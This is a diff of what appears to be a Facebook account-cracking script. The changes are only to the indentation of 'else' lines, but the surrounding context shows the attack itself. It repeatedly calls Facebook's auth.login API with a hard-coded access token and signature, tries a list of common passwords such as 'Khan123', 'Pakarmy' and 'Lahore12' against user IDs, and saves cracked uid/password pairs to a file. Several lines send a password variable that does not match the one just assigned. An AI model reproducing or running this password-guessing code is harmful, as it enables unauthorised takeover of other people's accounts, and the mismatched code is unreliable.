@@ -346,7 +346,7 @@ def crapil():
 		                                                            ok.write(uid+" | "+pass7+"\n")
 		                                                            ok.close()
 		                                                            oks.append(uid)
-								  else:
+							        else:
 		                                                    pass8=name+"786"
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass8 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                                    d=json.loads(q)
@@ -363,7 +363,7 @@ def crapil():
 		                                                            ok.write(uid+" | "+pass8+"\n")
 		                                                            ok.close()
 		                                                            oks.append(uid)
-						                                else:
+						                else:
 		                                                    pass9= "Khan123"
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass9 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                                    d=json.loads(q)
@@ -380,7 +380,7 @@ def crapil():
 		                                                            ok.write(uid+" | "+pass9+"\n")
 		                                                            ok.close()
 		                                                            oks.append(uid)
-													     else:
+				     		                else:
 		                                                    pass10= "000786"
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass10 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                                    d=json.loads(q)
@@ -397,7 +397,7 @@ def crapil():
 		                                                            ok.write(uid+" | "+pass10+"\n")
 		                                                            ok.close()
 		                                                            oks.append(uid)
-													    else:
+						                else:
 		                                                    pass11= "Bacha123"
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass11 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                                    d=json.loads(q)
@@ -414,7 +414,7 @@ def crapil():
 		                                                            ok.write(uid+" | "+pass11+"\n")
 		                                                            ok.close()
 		                                                            oks.append(uid)
-														else:
+								else:
 		                                                    pass12= "India123"
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass12 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                                    d=json.loads(q)
@@ -431,7 +431,7 @@ def crapil():
 		                                                            ok.write(uid+" | "+pass12+"\n")
 		                                                            ok.close()
 		                                                            oks.append(uid)
-														else:
+								else:
 		                                                    pass13= "Indonesia"
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass13 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                                    d=json.loads(q)
@@ -448,7 +448,7 @@ def crapil():
 		                                                            ok.write(uid+" | "+pass13+"\n")
 		                                                            ok.close()
 		                                                            oks.append(uid)
-														 else:
+		       					        else:
 		                                                    pass14= "Freefire"
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass14 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                                    d=json.loads(q)
@@ -465,7 +465,7 @@ def crapil():
 		                                                            ok.write(uid+" | "+pass14+"\n")
 		                                                            ok.close()
 		                                                            oks.append(uid)
-														else:
+								else:
 		                                                    pass15= "Ali1234"
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass15 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                                    d=json.loads(q)
@@ -482,7 +482,7 @@ def crapil():
 		                                                            ok.write(uid+" | "+pass15+"\n")
 		                                                            ok.close()
 		                                                            oks.append(uid)
-														else:
+								else:
 		                                                    pass16= "Pubglover"
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass16 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                                    d=json.loads(q)
@@ -499,7 +499,7 @@ def crapil():
 		                                                            ok.write(uid+" | "+pass16+"\n")
 		                                                            ok.close()
 		                                                            oks.append(uid)
-													     else:
+							        else:
 		                                                    pass17= "Allah123"
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass17 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                                    d=json.loads(q)
@@ -516,7 +516,7 @@ def crapil():
 		                                                            ok.write(uid+" | "+pass17+"\n")
 		                                                            ok.close()
 		                                                            oks.append(uid)
-														 else:
+							        else:
 		                                                    pass18= "Love123"
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass18 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                                    d=json.loads(q)
@@ -533,7 +533,7 @@ def crapil():
 		                                                            ok.write(uid+" | "+pass18+"\n")
 		                                                            ok.close()
 		                                                            oks.append(uid)
-														 else:
+								else:
 		                                                    pass19= "Fuck123"
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass19 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                                    d=json.loads(q)
@@ -550,7 +550,7 @@ def crapil():
 		                                                            ok.write(uid+" | "+pass19+"\n")
 		                                                            ok.close()
 		                                                            oks.append(uid)
-														 else:
+								else:
 		                                                    pass20= "Muhammad"
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass20 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                                    d=json.loads(q)
@@ -567,7 +567,7 @@ def crapil():
 		                                                            ok.write(uid+" | "+pass20+"\n")
 		                                                            ok.close()
 		                                                            oks.append(uid)
-														 else:
+							        else:
 		                                                    pass21= "Hacker123"
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass21 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                                    d=json.loads(q)
@@ -584,7 +584,7 @@ def crapil():
 		                                                            ok.write(uid+" | "+pass21+"\n")
 		                                                            ok.close()
 		                                                            oks.append(uid)
-														 else:
+								else:
 		                                                    pass22= "Pakarmy"
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass22 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                                    d=json.loads(q)
@@ -601,7 +601,7 @@ def crapil():
 		                                                            ok.write(uid+" | "+pass22+"\n")
 		                                                            ok.close()
 		                                                            oks.append(uid)
-														 else:
+								else:
 		                                                    pass23= "Swabi123"
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass23 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                                    d=json.loads(q)
@@ -618,7 +618,7 @@ def crapil():
 		                                                            ok.write(uid+" | "+pass23+"\n")
 		                                                            ok.close()
 		                                                            oks.append(uid)
-														 else:
+								else:
 		                                                    pass24= "Mardan123"
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass24 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                                    d=json.loads(q)
@@ -635,7 +635,7 @@ def crapil():
 		                                                            ok.write(uid+" | "+pass24+"\n")
 		                                                            ok.close()
 		                                                            oks.append(uid)
-														else:
+								else:
 		                                                    pass25= "Swat123"
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass25 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                                    d=json.loads(q)
@@ -652,7 +652,7 @@ def crapil():
 		                                                            ok.write(uid+" | "+pass26+"\n")
 		                                                            ok.close()
 		                                                            oks.append(uid)
-														else:
+								else:
 		                                                    pass27= "Karachi"
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass26 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                                    d=json.loads(q)
@@ -669,7 +669,7 @@ def crapil():
 		                                                            ok.write(uid+" | "+pass27+"\n")
 		                                                            ok.close()
 		                                                            oks.append(uid)
-														else:
+								else:
 		                                                    pass28= "Lahore12"
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass27 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                                    d=json.loads(q)
@@ -686,7 +686,7 @@ def crapil():
 		                                                            ok.write(uid+" | "+pass28+"\n")
 		                                                            ok.close()
 		                                                            oks.append(uid)
-		                                                 else:
+		                                                else:
 		                                                    pass29= "Shah123"
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass28 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                                    d=json.loads(q)
@@ -703,7 +703,7 @@ def crapil():
 		                                                            ok.write(uid+" | "+pass29+"\n")
 		                                                            ok.close()
 		                                                            oks.append(uid)
-											            else:
+						                else:
 		                                                    pass30= "Zaman123"
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass29 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                                    d=json.loads(q)
@@ -720,7 +720,7 @@ def crapil():
 		                                                            ok.write(uid+" | "+pass30+"\n")
 		                                                            ok.close()
 		                                                            oks.append(uid)
-														 else:
+								else:
 		                                                    pass31= "Peshawar"
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass30 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                                    d=json.loads(q)
@@ -737,7 +737,7 @@ def crapil():
 		                                                            ok.write(uid+" | "+pass31+"\n")
 		                                                            ok.close()
 		                                                            oks.append(uid)
-														 else:
+								else:
 		                                                    pass32= "Islamabad"
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass31 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                                    d=json.loads(q)
@@ -754,7 +754,7 @@ def crapil():
 		                                                            ok.write(uid+" | "+pass32+"\n")
 		                                                            ok.close()
 		                                                            oks.append(uid)
-														else:
+								else:
 		                                                    pass33= "Koko123"
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass32 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                                    d=json.loads(q)
